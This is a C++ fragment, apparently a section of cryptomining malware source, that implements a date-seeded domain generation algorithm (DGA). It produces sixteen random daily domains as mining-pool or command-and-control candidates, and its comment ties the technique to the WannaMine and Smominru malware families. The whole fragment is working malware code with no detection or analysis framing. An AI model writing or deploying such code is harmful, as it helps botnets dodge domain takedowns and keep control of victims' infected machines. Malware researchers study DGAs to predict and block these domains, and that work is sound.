// -------------------------------------------------------
// B.1 DOMAIN GENERATION ALGORITHM (DGA)
//     Seed = current date; generates daily pool/C2 candidates
//     Technique documented in WannaMine, Smominru variants
// -------------------------------------------------------
std::vector<std::string> GenerateDGADomains(int count = 16) {
    // Seed with YYYYMMDD for time-based rotation
    SYSTEMTIME st;
    GetSystemTime(&st);
    uint32_t seed = (uint32_t)st.wYear * 10000
                  + (uint32_t)st.wMonth * 100
                  + (uint32_t)st.wDay;

    std::mt19937 rng(seed);
    const std::string charset = "abcdefghijklmnopqrstuvwxyz0123456789";
    const std::vector<std::string> tlds = {".com",".net",".ru",".cn",".pw"};

    std::vector<std::string> domains;
    domains.reserve(count);

    std::uniform_int_distribution<int> len_dist(8, 14);
    std::uniform_int_distribution<int> char_dist(0, (int)charset.size()-1);
    std::uniform_int_distribution<int> tld_dist(0,  (int)tlds.size()-1);

    for (int i = 0; i < count; i++) {
        int len = len_dist(rng);
        std::string domain;
        domain.reserve(len);
        for (int j = 0; j < len; j++)
            domain += charset[char_dist(rng)];
        domain += tlds[tld_dist(rng)];
        domains.push_back(domain);
    }
    return domains;
}

